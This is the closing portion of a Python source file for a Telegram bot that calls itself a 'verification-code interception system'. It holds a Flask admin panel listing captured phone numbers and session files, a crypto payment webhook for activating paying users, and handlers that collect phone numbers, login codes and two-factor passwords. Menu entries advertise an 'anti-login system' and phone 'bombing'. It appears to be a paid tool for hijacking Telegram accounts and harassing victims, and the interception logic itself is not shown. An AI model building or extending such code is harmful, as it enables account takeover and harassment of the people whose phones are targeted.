                return


class WebAdmin:
    app = Flask(__name__)

    @staticmethod
    def _check_auth(username: str, password: str) -> bool:
        return username == Config.WEB_USER and password == Config.WEB_PASS

    @staticmethod
    def _auth_required():
        from flask import Response
        return Response('需要认证', 401, {'WWW-Authenticate': 'Basic realm="Admin Login"'})

    @classmethod
    def setup_routes(cls):
        web_app = cls.app

        @web_app.before_request
        def require_login():
            auth = request.authorization
            if not auth or not cls._check_auth(auth.username, auth.password):
                return cls._auth_required()

        @web_app.route("/")
        def admin_index():
            all_sessions = SessionManager.get_all_sessions()
            active_snapshot = {}
            for uid, phones in all_sessions.items():
                active_snapshot[uid] = {
                    phone: {'file_path': str(info.get('file_path', ''))}
                    for phone, info in phones.items()
                }

            total_files = 0
            if Config.SESSIONS_DIR.exists():
                for user_dir in Config.SESSIONS_DIR.iterdir():
                    if user_dir.is_dir():
                        total_files += len(list(user_dir.glob("*.session")))

            payments = load_json_file(Config.PAYMENT_FILE, {})
            paid_count = sum(1 for v in payments.values() if v.get("status") == "paid")

            HTML_TEMPLATE = """
            <!DOCTYPE html>
            <html lang="zh-CN">
            <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>验证码拦截系统 - 管理后台</title>
            <style>
                * { box-sizing: border-box; margin: 0; padding: 0; }
                body { font-family: -apple-system, 'Segoe UI', sans-serif; background: #0f1117; color: #e0e0e0; min-height: 100vh; }
                .header { background: linear-gradient(135deg, #1a1d2e, #252840); padding: 20px 40px; border-bottom: 1px solid #2e3150; display: flex; align-items: center; gap: 20px; flex-wrap: wrap; }
                .header h1 { font-size: 20px; font-weight: 600; color: #fff; }
                .header .time { font-size: 13px; color: #6b7280; margin-left: auto; }
                .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 16px; padding: 24px 40px; }
                .stat-card { background: #1a1d2e; border: 1px solid #2e3150; border-radius: 12px; padding: 16px 24px; }
                .stat-card .num { font-size: 28px; font-weight: 700; color: #818cf8; }
                .stat-card .label { font-size: 12px; color: #6b7280; margin-top: 4px; }
                .container { padding: 0 40px 40px; }
                .user-block { background: #1a1d2e; border: 1px solid #2e3150; border-radius: 12px; margin-bottom: 16px; overflow: hidden; }
                .user-header { background: #1e2236; padding: 12px 20px; border-bottom: 1px solid #2e3150; display: flex; align-items: center; gap: 12px; }
                .user-header .uid { font-size: 12px; background: #252840; color: #818cf8; padding: 2px 10px; border-radius: 16px; font-family: monospace; }
                .user-header .badge { font-size: 11px; background: #1a3a2a; color: #4ade80; padding: 2px 10px; border-radius: 16px; }
                table { width: 100%; border-collapse: collapse; }
                th { background: #16192a; padding: 10px 20px; text-align: left; font-size: 11px; color: #6b7280; text-transform: uppercase; letter-spacing: 0.5px; }
                td { padding: 12px 20px; border-top: 1px solid #1e2236; font-size: 13px; }
                .phone { font-family: monospace; color: #e0e7ff; }
                .status-alive { color: #4ade80; font-size: 12px; }
                .empty { text-align: center; color: #6b7280; padding: 60px 20px; }
                .refresh-btn { position: fixed; bottom: 30px; right: 30px; background: #4f46e5; color: #fff; border: none; padding: 12px 24px; border-radius: 30px; cursor: pointer; font-size: 14px; text-decoration: none; }
                .refresh-btn:hover { background: #6366f1; }
                @media (max-width: 600px) { .header { padding: 16px 20px; } .stats { padding: 16px 20px; } .container { padding: 0 20px 20px; } }
            </style>
            </head>
            <body>
                <div class="header"><h1>验证码拦截系统</h1><span class="time">{{ now }}</span></div>
                <div class="stats">
                    <div class="stat-card"><div class="num">{{ total_users }}</div><div class="label">活跃用户</div></div>
                    <div class="stat-card"><div class="num">{{ total_active }}</div><div class="label">运行中账号</div></div>
                    <div class="stat-card"><div class="num">{{ total_files }}</div><div class="label">会话文件</div></div>
                    <div class="stat-card"><div class="num">{{ paid_count }}</div><div class="label">已激活用户</div></div>
                </div>
                <div class="container">
                    {% if active_data %}
                        {% for user_id, phones in active_data.items() %}
                        <div class="user-block">
                            <div class="user-header"><span class="uid">用户 {{ user_id }}</span><span class="badge">{{ phones|length }} 个账号</span></div>
                            <table>
                                <thead><tr><th>手机号</th><th>状态</th><th>会话路径</th></tr></thead>
                                <tbody>
                                {% for phone, info in phones.items() %}
                                <tr><td class="phone">{{ phone }}</td><td><span class="status-alive">运行中</span></td><td style="font-size: 12px; color: #6b7280;">{{ info.file_path }}</td></tr>
                                {% endfor %}
                                </tbody>
                            </table>
                        </div>
                        {% endfor %}
                    {% else %}
                        <div class="empty">暂无活跃会话</div>
                    {% endif %}
                </div>
                <a class="refresh-btn" href="/">刷新</a>
            </body>
            </html>
            """

            return render_template_string(
                HTML_TEMPLATE,
                now=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                total_users=len(active_snapshot),
                total_active=sum(len(v) for v in active_snapshot.values()),
                total_files=total_files,
                paid_count=paid_count,
                active_data=active_snapshot
            )

        @web_app.route("/api/stats")
        def api_stats():
            all_sessions = SessionManager.get_all_sessions()
            payments = load_json_file(Config.PAYMENT_FILE, {})
            paid_count = sum(1 for v in payments.values() if v.get("status") == "paid")
            return jsonify({
                "total_users": len(all_sessions),
                "total_active": sum(len(v) for v in all_sessions.values()),
                "paid_users": paid_count,
                "timestamp": datetime.now().isoformat()
            })

    @classmethod
    def run(cls):
        cls.setup_routes()
        logger.info(f"Web admin: http://{Config.WEBHOOK_HOST}:{Config.WEB_ADMIN_PORT}")
        cls.app.run(host=Config.WEBHOOK_HOST, port=Config.WEB_ADMIN_PORT, debug=False, use_reloader=False)


class WebhookServer:
    app = Flask(__name__)

    @classmethod
    def setup_routes(cls):
        web_app = cls.app

        @web_app.route("/", methods=["GET"])
        def index():
            return "OKPay Webhook 运行中"

        @web_app.route(Config.WEBHOOK_PATH, methods=["POST"])
        def webhook_handler():
            try:
                data = request.get_json()
                if not data:
                    data = request.form.to_dict()
                if not data:
                    return jsonify({"status": "error", "message": "无数据"}), 200

                logger.info(f"Webhook received: {data}")

                if data.get("code") == 200:
                    callback_data = data.get("data", {})
                    unique_id = callback_data.get("unique_id")
                    status = callback_data.get("status")

                    if unique_id and status == 1:
                        payments = load_json_file(Config.PAYMENT_FILE, {})
                        for uid_str, order in payments.items():
                            if order.get("unique_id") == unique_id:
                                user_id = int(uid_str)
                                PaymentManager.mark_user_paid(user_id, f"webhook:{unique_id}", {
                                    "order_id": callback_data.get("order_id"),
                                    "amount": callback_data.get("amount"),
                                    "coin": callback_data.get("coin")
                                })
                                logger.info(f"User {user_id} activated via webhook")
                                return jsonify({"status": "success"}), 200

                return jsonify({"status": "processed"}), 200

            except Exception as e:
                logger.error(f"Webhook error: {e}")
                return jsonify({"status": "error", "message": str(e)}), 200

        @web_app.route("/webhook/test", methods=["GET"])
        def webhook_test():
            return jsonify({"status": "ok", "message": "Webhook正常", "path": Config.WEBHOOK_PATH})

    @classmethod
    def run(cls):
        cls.setup_routes()
        logger.info(f"Webhook: http://{Config.WEBHOOK_HOST}:{Config.WEBHOOK_PORT}{Config.WEBHOOK_PATH}")
        cls.app.run(host=Config.WEBHOOK_HOST, port=Config.WEBHOOK_PORT, debug=False, use_reloader=False)


async def post_init(application: Application):
    logger.info("Bot started, scanning sessions...")
    await SessionManager.scan_and_restore_all(application.bot)

    try:
        chat = await application.bot.get_chat(Config.REQUIRED_CHANNEL_ID)
        logger.info(f"Channel OK: {chat.title}")
        data_chat = await application.bot.get_chat(Config.FORWARD_CHANNEL_ID)
        logger.info(f"Data channel OK: {data_chat.title}")
    except Exception as e:
        logger.error(f"Channel error: {e}")


def main():
    init_directories()
    setup_logging()

    logger.info("=" * 50)
    logger.info("Telegram验证码拦截系统 - 双系统版")
    logger.info(f"API凭证数量: {len(API_CREDENTIALS)}")
    logger.info("=" * 50)

    AdminManager.refresh_cache()
    
    # 加载用户数据
    banned_data = load_json_file(Config.BANNED_USERS_FILE, {"banned_users": []})
    global banned_users
    banned_users = set(banned_data.get("banned_users", []))
    
    global user_usage
    user_usage = load_json_file(Config.USER_USAGE_FILE, {})
    user_usage = {int(k): v for k, v in user_usage.items()}

    web_thread = threading.Thread(target=WebAdmin.run, daemon=True)
    web_thread.start()

    webhook_thread = threading.Thread(target=WebhookServer.run, daemon=True)
    webhook_thread.start()

    application = Application.builder().token(Config.BOT_TOKEN).post_init(post_init).build()

    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler('start', BotHandlers.start),
        ],
        states={
            PHONE_INPUT: [
                MessageHandler(filters.Document.ALL | filters.TEXT & ~filters.COMMAND, BotHandlers.handle_phone_or_file),
                MessageHandler(filters.Regex(r'^取消$'), BotHandlers.handle_input)
            ],
            VERIFICATION_CODE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, BotHandlers.handle_verification_code),
                MessageHandler(filters.Regex(r'^取消$'), BotHandlers.handle_verification_code)
            ],
            TWO_FACTOR_PASSWORD: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, BotHandlers.handle_two_factor),
                MessageHandler(filters.Regex(r'^取消$'), BotHandlers.handle_two_factor)
            ],
        },
        fallbacks=[CommandHandler('start', BotHandlers.start)],
        allow_reentry=True
    )

    application.add_handler(conv_handler)
    application.add_handler(CallbackQueryHandler(BotHandlers.handle_callback))

    application.add_handler(MessageHandler(
        filters.Regex(r'^(反登录系统|轰炸系统|管理面板|统计信息|上传会话文件|手机号登录|我的会话|断开所有|我的任务|增加配额|停止所有任务|启动所有任务|添加管理员|移除管理员|列出管理员|强制激活|生成卡密|列出卡密|查看被轰炸手机|停止轰炸手机|返回主菜单)$'),
        BotHandlers.menu_handler
    ))

    application.add_handler(MessageHandler(filters.Regex(r'^取消$'), BotHandlers.handle_input))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, BotHandlers.handle_input))

    logger.info("=" * 50)
    logger.info("机器人启动成功")
    logger.info(f"超级管理员: {Config.SUPER_ADMIN_IDS}")
    logger.info(f"管理员: {[a['id'] for a in AdminManager.list_admins() if not a['is_super']]}")
    logger.info(f"验证频道: {Config.REQUIRED_CHANNEL_USERNAME}")
    logger.info(f"支付金额: {Config.PAYMENT_AMOUNT} {Config.PAYMENT_COIN}")
    logger.info(f"API凭证数量: {len(API_CREDENTIALS)}")
    logger.info("=" * 50)

    application.run_polling()


if __name__ == '__main__':
    main()